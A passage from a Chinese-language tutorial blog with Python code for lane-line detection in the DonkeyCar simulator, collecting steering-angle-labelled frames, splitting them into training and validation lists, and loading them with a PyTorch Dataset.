class="number">255</span>)</span><br><span class="line">    <span class="comment"># 提取感兴趣区域</span></span><br><span class="line">    croped_edge = cv2.bitwise_and(edges, mask)</span><br><span class="line">    <span class="keyword">return</span> croped_edge</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_line</span>(<span class="params">edges</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    基于霍夫变换的直线检测</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    rho = <span class="number">1</span>  <span class="comment"># 距离精度：1像素</span></span><br><span class="line">    angle = np.pi / <span class="number">180</span>  <span class="comment">#角度精度：1度</span></span><br><span class="line">    min_thr = <span class="number">10</span>  <span class="comment">#最少投票数</span></span><br><span class="line">    lines = cv2.HoughLinesP(edges,</span><br><span class="line">                            rho,</span><br><span class="line">                            angle,</span><br><span class="line">                            min_thr,</span><br><span class="line">                            np.array([]),</span><br><span class="line">                            minLineLength=<span class="number">8</span>,</span><br><span class="line">                            maxLineGap=<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">average_lines</span>(<span class="params">frame, lines, direction=<span class="string">&#x27;left&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    小线段聚类</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lane_lines = []</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(direction + <span class="string">&#x27;没有检测到线段&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> lane_lines</span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    fits = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">if</span> x1 == x2:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 计算拟合直线</span></span><br><span class="line">            fit = np.polyfit((x1, x2), (y1, y2), <span class="number">1</span>)</span><br><span class="line">            slope = fit[<span class="number">0</span>]</span><br><span class="line">            intercept = fit[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> direction == <span class="string">&#x27;left&#x27;</span> <span class="keyword">and</span> slope &lt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">            <span class="keyword">elif</span> direction == <span class="string">&#x27;right&#x27;</span> <span class="keyword">and</span> slope &gt; <span class="number">0</span>:</span><br><span class="line">                fits.append((slope, intercept))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fits) &gt; <span class="number">0</span>:</span><br><span class="line">        fit_average = np.average(fits, axis=<span class="number">0</span>)</span><br><span class="line">        lane_lines.append(make_points(frame, fit_average))</span><br><span class="line">    <span class="keyword">return</span> lane_lines</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_points</span>(<span class="params">frame, line</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    根据直线斜率和截距计算线段起始坐标</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    height, width, _ = frame.shape</span><br><span class="line">    slope, intercept = line</span><br><span class="line">    y1 = height</span><br><span class="line">    y2 = <span class="built_in">int</span>(y1 * <span class="number">1</span> / <span class="number">2</span>)</span><br><span class="line">    x1 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y1 - intercept) / slope)))</span><br><span class="line">    x2 = <span class="built_in">max</span>(-width, <span class="built_in">min</span>(<span class="number">2</span> * width, <span class="built_in">int</span>((y2 - intercept) / slope)))</span><br><span class="line">    <span class="keyword">return</span> [[x1, y1, x2, y2]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_line</span>(<span class="params">frame, lines, line_color=(<span class="params"><span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span></span>), line_width=<span class="number">2</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    在原图上展示线段</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    line_img = np.zeros_like(frame)</span><br><span class="line">    <span class="keyword">if</span> lines <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">for</span> x1, y1, x2, y2 <span class="keyword">in</span> line:</span><br><span class="line">                cv2.line(line_img, (x1, y1), (x2, y2), line_color, line_width)</span><br><span class="line">    line_img = cv2.addWeighted(frame, <span class="number">0.8</span>, line_img, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> line_img</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完整采集代码如下，同样有一定的变化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> gym_donkeycar</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> region_of_interest, detect_line, make_points, average_lines, display_line</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 设置模拟器环境</span></span><br><span class="line">    env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始启动</span></span><br><span class="line">    action = np.array([<span class="number">0</span>, <span class="number">0.3</span>])  <span class="comment"># 动作控制，第1个转向值，第2个油门值</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 执行动作</span></span><br><span class="line">    obv, reward, done, info = env.step(action)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 获取图像</span></span><br><span class="line">    frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 运行4000次动作</span></span><br><span class="line">    pic_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4000</span>):</span><br><span class="line">        <span class="comment"># 转换图像到HSV空间</span></span><br><span class="line">        height, width, _ = frame.shape</span><br><span class="line">        hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 黄色区域检测</span></span><br><span class="line">        lower_blue = np.array([<span class="number">15</span>, <span class="number">40</span>, <span class="number">40</span>])</span><br><span class="line">        upper_blue = np.array([<span class="number">45</span>, <span class="number">255</span>, <span class="number">255</span>])</span><br><span class="line">        yellow_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 白色区域检测</span></span><br><span class="line">        lower_blue = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>])</span><br><span class="line">        upper_blue = np.array([<span class="number">180</span>, <span class="number">30</span>, <span class="number">255</span>])</span><br><span class="line">        white_mask = cv2.inRange(hsv, lower_blue, upper_blue)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 黄色线边缘提取</span></span><br><span class="line">        yellow_edge = cv2.Canny(yellow_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 白色线边缘提取</span></span><br><span class="line">        white_edge = cv2.Canny(white_mask, <span class="number">200</span>, <span class="number">400</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 黄色线感兴趣区域提取</span></span><br><span class="line">        yellow_roi = region_of_interest(yellow_edge, color=<span class="string">&#x27;yellow&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 白色线感兴趣区域提取</span></span><br><span class="line">        white_roi = region_of_interest(white_edge, color=<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 黄色线段检测</span></span><br><span class="line">        yellow_lines = detect_line(yellow_roi)</span><br><span class="line">        yellow_lane = average_lines(frame, yellow_lines, direction=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">        <span class="comment">#yellow_show = display_line(frame, yellow_lane)</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 白色线段检测</span></span><br><span class="line">        white_lines = detect_line(white_roi)</span><br><span class="line">        white_lane = average_lines(frame, white_lines, direction=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">        <span class="comment">#white_show = display_line(frame, white_lane, line_color=(255, 0, 0))</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 计算转向角</span></span><br><span class="line">        x_offset = <span class="number">0</span></span><br><span class="line">        y_offset = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(yellow_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane) &gt; <span class="number">0</span>:  <span class="comment"># 检测到2条线</span></span><br><span class="line">            _, _, left_x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            _, _, right_x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            mid = <span class="built_in">int</span>(width / <span class="number">2</span>)</span><br><span class="line">            x_offset = (left_x2 + right_x2) / <span class="number">2</span> - mid</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(yellow_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(yellow_lane[<span class="number">0</span>]) == <span class="number">1</span>:  <span class="comment"># 只检测到黄色行道线</span></span><br><span class="line">            x1, _, x2, _ = yellow_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            x_offset = x2 - x1</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(white_lane) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(white_lane[<span class="number">0</span>]) == <span class="number">1</span>:  <span class="comment"># 只检测到白色行道线</span></span><br><span class="line">            x1, _, x2, _ = white_lane[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            x_offset = x2 - x1</span><br><span class="line">            y_offset = <span class="built_in">int</span>(height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 一条线都没检测到</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;检测不到行道线，退出程序&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">        angle_to_mid_radian = math.atan(x_offset / y_offset)</span><br><span class="line">        angle_to_mid_deg = <span class="built_in">int</span>(angle_to_mid_radian * <span class="number">180.0</span> / math.pi)</span><br><span class="line">        steering_angle = angle_to_mid_deg / <span class="number">45.0</span></span><br><span class="line">        action = np.array([steering_angle, <span class="number">0.1</span>])  <span class="comment"># 油门值恒定</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 记录当前图像和转向角度</span></span><br><span class="line">        img_path = <span class="string">&quot;log/&#123;:d&#125;_&#123;:.4f&#125;.jpg&quot;</span>.<span class="built_in">format</span>(pic_index, steering_angle)</span><br><span class="line">        cv2.imwrite(img_path, frame)</span><br><span class="line">        pic_index += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 执行动作</span></span><br><span class="line">        obv, reward, done, info = env.step(action)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 重新获取图像</span></span><br><span class="line">        frame = cv2.cvtColor(obv, cv2.COLOR_RGB2BGR)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 运行完以后重置当前场景</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;结束本次采集&#x27;</span>)</span><br><span class="line">    obv = env.reset()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>图片名采用“图片帧号_转向角度.jpg”的形式命名。上述代码每次跑完会在log目录下生成4000多张图片。由于每次的地图都是随机生成的，因此我们可以多跑几次，多收集一些数据。</p><p><img src="/.io//Snipaste_2022-04-30_13-50-48.png"></p><p>最终共采集10个文件夹图片，总共4万张图片：</p><p><img src="/.io//Snipaste_2022-04-30_17-05-30.png"></p><p>接下来我们需要对这些图片进行整理，拆分数据集用于训练和验证。我们把这些文件夹移动到data&#x2F;simulate下，注意这个文件夹<strong>需要自己手动创建</strong>。</p><p>详细脚本代码create_data_lists.py如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat_data_list</span>(<span class="params">dataset_path, file_list, mode=<span class="string">&#x27;train&#x27;</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    创建txt文件列表</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(dataset_path, (mode + <span class="string">&#x27;.txt&#x27;</span>)), <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> (imgpath, angle) <span class="keyword">in</span> file_list:</span><br><span class="line">            f.write(imgpath + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(angle) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(mode + <span class="string">&#x27;.txt 已生成&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFileList</span>(<span class="params"><span class="built_in">dir</span>, Filelist, ext=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取文件夹及其子文件夹中文件列表</span></span><br><span class="line"><span class="string">    输入 dir: 文件夹根目录</span></span><br><span class="line"><span class="string">    输入 ext: 扩展名</span></span><br><span class="line"><span class="string">    返回: 文件路径列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    newDir = <span class="built_in">dir</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="built_in">dir</span>):</span><br><span class="line">        <span class="keyword">if</span> ext <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            Filelist.append(<span class="built_in">dir</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> ext <span class="keyword">in</span> <span class="built_in">dir</span>[-<span class="number">3</span>:]:</span><br><span class="line">                Filelist.append(<span class="built_in">dir</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">elif</span> os.path.isdir(<span class="built_in">dir</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> os.listdir(<span class="built_in">dir</span>):</span><br><span class="line">            newDir = os.path.join(<span class="built_in">dir</span>, s)</span><br><span class="line">            getFileList(newDir, Filelist, ext)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> Filelist</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 设置参数</span></span><br><span class="line">    org_img_folder = <span class="string">&#x27;./data/simulate&#x27;</span>  <span class="comment"># 数据集根目录</span></span><br><span class="line">    train_ratio = <span class="number">0.8</span>  <span class="comment"># 训练集占比</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 检索jpg文件</span></span><br><span class="line">    jpglist = getFileList(org_img_folder, [], <span class="string">&#x27;jpg&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;本次执行检索到 &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(jpglist)) + <span class="string">&#x27; 个jpg文件\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    file_list = <span class="built_in">list</span>()</span><br><span class="line">    <span class="comment"># 解析转向值</span></span><br><span class="line">    <span class="keyword">for</span> jpgpath <span class="keyword">in</span> jpglist:</span><br><span class="line">        <span class="built_in">print</span>(jpgpath)</span><br><span class="line">        curDataDir = os.path.dirname(jpgpath)</span><br><span class="line">        basename = os.path.basename(jpgpath)</span><br><span class="line">        angle = (basename[:-<span class="number">4</span>]).split(<span class="string">&#x27;_&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        imgPath = os.path.join(curDataDir, basename).replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">        file_list.append((imgPath, angle))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 切分数据</span></span><br><span class="line">    random.seed(<span class="number">256</span>)</span><br><span class="line">    random.shuffle(file_list)</span><br><span class="line">    train_num = <span class="built_in">int</span>(<span class="built_in">len</span>(file_list) * train_ratio)</span><br><span class="line">    train_list = file_list[<span class="number">0</span>:train_num]</span><br><span class="line">    val_list = file_list[train_num:]</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 创建列表文件</span></span><br><span class="line">    creat_data_list(org_img_folder, train_list, mode=<span class="string">&#x27;train&#x27;</span>)</span><br><span class="line">    creat_data_list(org_img_folder, val_list, mode=<span class="string">&#x27;val&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    程序入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>上述代码我们查找每个log文件夹下的jpg文件，然后解析出对应的转向值。将这些值最后分别保存到train.txt和val.txt文件中。在代码里面，我们设定训练集占比0.8，剩下的0.2则为验证集。</p><p>生成的train.txt和val.txt文件每行内容表示一个样本，由图片路径和转向值组成，中间用空格隔开。</p><p>接下来我们将使用Pytoch框架实现深度学习算法进行训练、验证。 </p><h3 id="3-3模型训练"><a href="#3-3模型训练" class="headerlink" title="3.3模型训练"></a>3.3模型训练</h3><p> 首先定义数据采集器datasets.py，代码如下： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AutoDriveDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数据集加载器</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_folder, mode, transform=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :参数 data_folder: # 数据文件所在文件夹根路径(train.txt和val.txt所在文件夹路径)</span></span><br><span class="line"><span class="string">        :参数 mode: &#x27;train&#x27; 或者 &#x27;val&#x27;</span></span><br><span class="line"><span class="string">        :参数 normalize_type: 图像归一化处理方式</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">        self.data_folder = data_folder</span><br><span class="line">        self.mode = mode.lower()</span><br><span class="line">        self.transform = transform</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">assert</span> self.mode <span class="keyword">in</span> &#123;<span class="string">&#x27;train&#x27;</span>, <span class="string">&#x27;val&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 读取图像列表路径</span></span><br><span class="line">        <span class="keyword">if</span> self.mode == <span class="string">&#x27;train&#x27;</span>:</span><br><span class="line">            file_path=os.path.join(data_folder, <span class="string">&#x27;train.txt&#x27;</span>)            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path=os.path.join(data_folder, <span class="string">&#x27;val.txt&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        self.file_list=<span class="built_in">list</span>()      </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            files = f.readlines()</span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                <span class="keyword">if</span> file.strip() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                self.file_list.append([file.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>],<span class="built_in">float</span>(file.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>])])</span><br><span class="line">                </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, i</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :参数 i: 图像检索号</span></span><br><span class="line"><span class="string">        :返回: 返回第i个图像和标签</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 读取图像</span></span><br><span class="line">        img = cv2.imread(self.file_list[i][<span class="number">0</span>])</span><br><span class="line">        img = cv2.cvtColor(img,cv2.COLOR_BGR2HSV)</span><br><span class="line">        <span class="keyword">if</span> self.transform:</span><br><span class="line">            img = self.transform(img)</span><br><span class="line">        <span class="comment"># 读取标签</span></span><br><span class="line">        label = self.file_list[i][<span class="number">1</span>]</span><br><span class="line">        label = torch.from_numpy(np.array([label])).<span class="built_in">float</span>()</span><br><span class="line">        <span class="keyword">return</span> img, label</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        为了使用PyTorch的DataLoader,必须提供该方法.</span></span><br><span class="line"><span class="string">        :返回: 加载的图像总数</span></span><br><span class="line"><span class="string">        